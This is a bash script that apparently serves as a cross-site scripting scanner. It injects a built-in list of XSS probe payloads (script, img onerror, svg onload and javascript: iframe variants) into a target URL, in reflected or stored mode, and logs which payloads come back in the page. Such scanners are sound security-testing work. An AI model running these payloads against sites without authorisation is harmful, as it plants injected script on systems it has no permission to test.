#!/bin/bash

# XSS Payload Injector: Tests for reflected and stored XSS

RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

default_payloads=(
  "<script>alert(1)</script>"
  "<img src=x onerror=alert(1)>"
  "\"><svg onload=alert(1)>"
  "'><script>alert(1)</script>"
  "<iframe src='javascript:alert(1)'></iframe>"
)

# Default values
mode="reflected"
check_url=""
payloads=()

print_usage() {
  echo "Usage:"
  echo "  $0 -u <url> [-f <payload_file>] [-o <output_file>] [--mode reflected|stored] [--check-url <view_url>]"
  echo ""
  echo "Examples:"
  echo "  $0 -u 'http://target.com/vuln.php?q='"
  echo "  $0 -u 'http://target.com/submit-comment' --mode stored --check-url 'http://target.com/view-comments'"
}

# Parse arguments
while [[ "$#" -gt 0 ]]; do
  case "$1" in
    -u) url="$2"; shift ;;
    -f) file="$2"; shift ;;
    -o) output="$2"; shift ;;
    --mode) mode="$2"; shift ;;
    --check-url) check_url="$2"; shift ;;
    -h|--help) print_usage; exit 0 ;;
    *) echo -e "${RED}[!] Unknown argument: $1${NC}"; print_usage; exit 1 ;;
  esac
  shift
done

# Validate input
if [[ -z "$url" ]]; then
  echo -e "${RED}[!] URL is required. Use -u <url>${NC}"
  exit 1
fi

if [[ "$mode" == "stored" && -z "$check_url" ]]; then
  echo -e "${RED}[!] Stored mode requires --check-url to view stored content.${NC}"
  exit 1
fi

output="${output:-xss-log.txt}"
echo "[*] XSS Scan Log - Mode: $mode - Target: $url" > "$output"

# Load payloads
if [[ -n "$file" && -f "$file" ]]; then
  echo -e "${BLUE}[*] Using payloads from: $file${NC}"
  while IFS= read -r line; do
    [[ -n "$line" ]] && payloads+=("$line")
  done < "$file"
else
  echo -e "${BLUE}[*] Using default XSS payloads${NC}"
  payloads=("${default_payloads[@]}")
fi

# Start testing
for payload in "${payloads[@]}"; do
  encoded=$(printf '%s' "$payload" | jq -s -R -r @uri)
  
  if [[ "$mode" == "reflected" ]]; then
    target="${url}${encoded}"
    echo -e "${BLUE}[+] Testing reflected XSS with: $payload${NC}"
    response=$(curl -s "$target")

    if echo "$response" | grep -Fq "$payload"; then
      echo -e "${RED}[!] Reflected XSS found! Payload: $payload${NC}"
      echo "[!] $payload (reflected)" >> "$output"
      echo "$target" >> "$output"
    else
      echo -e "${GREEN}[-] Not reflected.${NC}"
    fi

  elif [[ "$mode" == "stored" ]]; then
    echo -e "${BLUE}[+] Submitting payload for stored XSS: $payload${NC}"
    curl -s -X POST -d "input=${payload}" "$url" > /dev/null

    echo -e "${BLUE}[~] Waiting and checking: $check_url${NC}"
    sleep 2
    view_response=$(curl -s "$check_url")

    if echo "$view_response" | grep -Fq "$payload"; then
      echo -e "${RED}[!] Stored XSS found! Payload appears at: $check_url${NC}"
      echo "[!] $payload (stored)" >> "$output"
      echo "$check_url" >> "$output"
    else
      echo -e "${GREEN}[-] Not stored.${NC}"
    fi
  fi
done

echo -e "${BLUE}[*] Done. Output saved to $output${NC}"
